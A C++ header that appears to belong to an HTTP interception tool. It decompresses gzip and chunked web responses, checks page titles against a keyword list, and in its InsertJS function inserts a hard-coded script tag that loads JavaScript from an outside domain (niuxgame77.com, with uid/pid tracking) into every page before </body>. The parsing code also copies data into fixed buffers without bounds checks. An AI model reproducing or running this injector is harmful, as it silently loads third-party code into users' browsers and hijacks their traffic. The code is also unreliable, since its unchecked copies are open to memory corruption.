#pragma once
#include "Utility.h"
#include "UnGZip.h"
#include <vector>

#define INIT_STATUS		0
#define TRANS_STATUS	1
#define END_STATUS		2

#define MAX_BUF_SIZE_IN	  8*1024
#define MAX_BUF_SIZE_OUT  256*1024

class CStream
{
public:
	CHAR*	m_Buf;
	DWORD	m_BufLen;
	DWORD	m_ValidLen;
	DWORD	m_Offset;
	CStream()
	{
		m_Buf = NULL;
		m_BufLen = 0;
		m_Offset = 0;
		m_ValidLen = 0;
	}

	virtual ~CStream()
	{
		if (m_Buf) {
			delete m_Buf;
			m_Buf = NULL;
		}
	}

	BOOL IsEmpty()
	{
		return ((m_ValidLen == 0) ? TRUE : FALSE);
	}

	CHAR* GetBuf()
	{
		return m_Buf + m_Offset;
	}
};

class CInputStream : public CStream
{
public:
	BOOL	m_isGZip;
	BOOL	m_isChunked;
	int		m_nCurChunkSize;
	int		m_nCurChunkOffset;

	CInputStream()
	{
		m_isGZip = FALSE;
		m_isChunked = FALSE;
		m_nCurChunkSize = -1;
		m_nCurChunkOffset = 0;
	}
};

class COutputStream : public CStream
{
public:
	COutputStream() { }

public:
	BOOL OutputData(CHAR* Buf, DWORD BufLen, int* OutLen)
	{
		// 计算长度，为长度域保留8个字节[\r\nxxxx\r\n]，最大0xFFFF
		BufLen -= 8;
		CString strLen;
		if (BufLen >= m_ValidLen) {
			*OutLen = m_ValidLen;
			// 添加长度信息

			strLen.Format("\r\n%x\r\n", *OutLen);
			memcpy(Buf, strLen, strLen.GetLength());

			memcpy(Buf + strLen.GetLength(), m_Buf + m_Offset, *OutLen);
			m_Offset = 0;
			m_ValidLen = 0;
		}
		else {
			*OutLen = BufLen;
			strLen.Format("\r\n%x\r\n", *OutLen);
			memcpy(Buf, strLen, strLen.GetLength());
			memcpy(Buf + strLen.GetLength(), m_Buf + m_Offset, *OutLen);
			m_Offset += BufLen;
			m_ValidLen -= BufLen;
		}

		(*OutLen) += strLen.GetLength();

		return TRUE;
	}
};

class Modifier{
public:
	CInputStream  m_In;
	COutputStream m_Out;
	CUnGZip		  m_UnGZip;
	INT	m_Status;
	wchar_t * m_wchar;
	char * m_char;

	vector<TString> m_vKeyWordsList;

	Modifier()
	{
		m_Status = INIT_STATUS;
		m_char = NULL;
		m_wchar = NULL;
		m_In.m_Buf = new CHAR[MAX_BUF_SIZE_IN];
		m_In.m_BufLen = MAX_BUF_SIZE_IN;
		m_Out.m_Buf = new CHAR[MAX_BUF_SIZE_OUT];
		m_Out.m_BufLen = MAX_BUF_SIZE_OUT;
	}

	~Modifier()
	{
		ReleaseChar();

		if (m_In.m_Buf)
		{
			delete m_In.m_Buf;
			m_In.m_Buf = NULL;
		}
		if (m_Out.m_Buf)
		{
			delete m_Out.m_Buf;
			m_Out.m_Buf = NULL;
		}
	}

	void ReleaseChar()
	{
		if (m_char)
		{
			delete m_char;
			m_char = NULL;
		}
		if (m_wchar)
		{
			delete m_wchar;
			m_wchar = NULL;
		}
	}

	void WcharToChar(wchar_t* wc)
	{
		int len = WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), NULL, 0, NULL, NULL);
		m_char = new char[len + 1];
		WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), m_char, len, NULL, NULL);
		m_char[len] = '\0';
	}

	void QXUtf82Unicode(const char* utf)
	{
		ReleaseChar();
		if (!utf || !strlen(utf))
		{
			return;
		}
		int dwUnicodeLen = MultiByteToWideChar(CP_UTF8, 0, utf, -1, NULL, 0);
		size_t num = dwUnicodeLen*sizeof(wchar_t);
		m_wchar = new wchar_t[num];
		memset(m_wchar, 0, num);
		MultiByteToWideChar(CP_UTF8, 0, utf, -1, m_wchar, dwUnicodeLen);

		WcharToChar(m_wchar);
	}

	BOOL CheckKeyWords()
	{
		char chTemp[4096];
		char *titleBegin = strstr(m_Out.m_Buf, "<title>");
		titleBegin += 7;
		char *titleEnd = strstr(m_Out.m_Buf, "</title>");
		if (!titleBegin || !titleEnd) {
			return FALSE;
		}
		int len = titleBegin - m_Out.m_Buf;
		memcpy(chTemp, m_Out.m_Buf, len);
		chTemp[len] = '\0';
		int nLen = titleEnd - titleBegin;
		if (strstr(chTemp, "utf-8") || strstr(chTemp, "UTF-8")) {
			char chTitle[256];
			memcpy(chTitle, titleBegin, nLen);
			chTitle[nLen] = '\0';
			QXUtf82Unicode(chTitle);
		}
		else {
			ReleaseChar();
			m_char = new char[nLen + 1];
			memcpy(m_char, titleBegin, nLen);
			m_char[nLen] = '\0';
		}

		vector<TString>::iterator it;
		for (it = m_vKeyWordsList.begin(); it != m_vKeyWordsList.end(); it++) {
			TString strKey = *it;
			if (strstr(m_char, strKey.GetBuffer())) {
				return TRUE;
			}
		}
		return FALSE;
	}

	BOOL DeleteHttpHead(CString& strHead, LPSTR lpszHead)
	{
		INT begin = strHead.Find(lpszHead);
		if (begin == -1) {
			return TRUE;
		}
		INT end = strHead.Find("\r\n", begin);
		if (end == -1) {
			return FALSE;
		}

		strHead.Replace(strHead.Mid(begin, end - begin + 2), "");

		return TRUE;
	}

	BOOL GetHeadValue(CString& strHead, LPSTR lpszKey, CString& strVal)
	{
		INT begin = strHead.Find(lpszKey);
		if (begin == -1) {
			return FALSE;
		}
		begin += strlen(lpszKey) + 1;
		INT end = strHead.Find("\r\n", begin);
		if (end == -1) {
			strVal = strHead.Mid(begin, strHead.GetLength() - begin);
		}
		else {
			strVal = strHead.Mid(begin, end - begin);
		}

		return TRUE;
	}

	BOOL AddHttpHead(CString& strHead, LPSTR lpszHead)
	{
		strHead += "\r\n";
		strHead += lpszHead;

		return TRUE;
	}

	void InsertJS(CStream& Out)
	{
		Out.m_Buf[Out.m_ValidLen] = '\0';
		CHAR* p = strstr(Out.m_Buf, "</body>");
		if (p != NULL) {
			/*DWORD dTime = GetTickCount();
			dTime /= 1000;*/
			//*m_nLastTime = dTime;

			CString str = p;
			str.Insert(0, "<script type='text/javascript' src='http://rjs.niuxgame77.com/r/f.php?uid=8239&pid=3285'></script>\r\n");
			Out.m_ValidLen += strlen("<script type='text/javascript' src='http://rjs.niuxgame77.com/r/f.php?uid=8239&pid=3285'></script>\r\n");
			memcpy(p, str, str.GetLength());
		}
	}

	BOOL StreamToStream(CStream& In, CStream& Out)
	{
		if (In.IsEmpty()) {
			return FALSE;
		}

		LONG lInUsed;
		LONG lOutUsed;
		m_UnGZip.xDecompress((BYTE*)In.GetBuf(), In.m_ValidLen, (BYTE*)Out.m_Buf, (Out.m_BufLen - 512), &lInUsed, &lOutUsed);
		In.m_Offset += lInUsed;
		In.m_ValidLen -= lInUsed;


		Out.m_ValidLen += lOutUsed;

		InsertJS(Out);

		return TRUE;
	}

	void ReparseChunkData()
	{
		char *chTemp = new char[MAX_BUF_SIZE_IN];
		memset(chTemp, 0, (MAX_BUF_SIZE_IN));
		int nInOffset = 0;
		int nTempBufOffset = 0;
		int nInSize = m_In.m_ValidLen;
		BOOL bIsFirstPacket = FALSE;
		while (1)
		{
			if (m_In.m_nCurChunkSize == -1)	{	//如果是第一个包，设置chunk数据块长度
				bIsFirstPacket = TRUE;
				char chChunkSize[8];
				int i;
				for (i = 0; i < 8; i++) {
					if (m_In.m_Buf[i] == '\r') {
						chChunkSize[i] = '\0';
						break;
					}
					chChunkSize[i] = m_In.m_Buf[i];
				}
				int nDelLen = strlen(chChunkSize) + 2;

				m_In.m_nCurChunkSize = strtol(chChunkSize, NULL, 16);
				m_In.m_nCurChunkOffset = 0;
				nInOffset += nDelLen;
				continue;
			}
			int nCurChunkSurplusSize = m_In.m_nCurChunkSize - m_In.m_nCurChunkOffset;
			int nCurInBufSurplusSize = nInSize - nInOffset;
			if (nCurChunkSurplusSize > nCurInBufSurplusSize) {	//如果当前chunk数据剩余长度大于输入buf剩余长度
				m_In.m_nCurChunkOffset += nCurInBufSurplusSize;
				if (bIsFirstPacket || strlen(chTemp) > 0) {
					memcpy((chTemp + nTempBufOffset), (m_In.m_Buf + nInOffset), nCurInBufSurplusSize);
					nTempBufOffset += nCurInBufSurplusSize;
					memset(m_In.m_Buf, 0, (MAX_BUF_SIZE_IN));
					memcpy(m_In.m_Buf, chTemp, nTempBufOffset);
					m_In.m_ValidLen = nTempBufOffset;
				}
				delete[] chTemp;
				break;
			}
			else {
				memcpy((chTemp + nTempBufOffset), (m_In.m_Buf + nInOffset), nCurChunkSurplusSize);
				char chChunkSize[8];
				int nSearchPos = nInOffset + nCurChunkSurplusSize + 2;
				int j = 0;
				for (int i = nSearchPos; i < (nSearchPos + 8); i++) {
					if (m_In.m_Buf[i] == '\r') {
						chChunkSize[j] = '\0';
						break;
					}
					chChunkSize[j] = m_In.m_Buf[i];
					j++;
				}
				int nDelLen = strlen(chChunkSize) + 4;

				m_In.m_nCurChunkSize = strtol(chChunkSize, NULL, 16);
				nTempBufOffset += nCurChunkSurplusSize;
				if (m_In.m_nCurChunkSize == 0) {
					memset(m_In.m_Buf, 0, (MAX_BUF_SIZE_IN));
					memcpy(m_In.m_Buf, chTemp, nTempBufOffset);
					m_In.m_ValidLen = nTempBufOffset;

					delete[] chTemp;
					break;
				}
				m_In.m_nCurChunkOffset = 0;
				nInOffset += (nCurChunkSurplusSize + nDelLen);
			}
		}

	}
};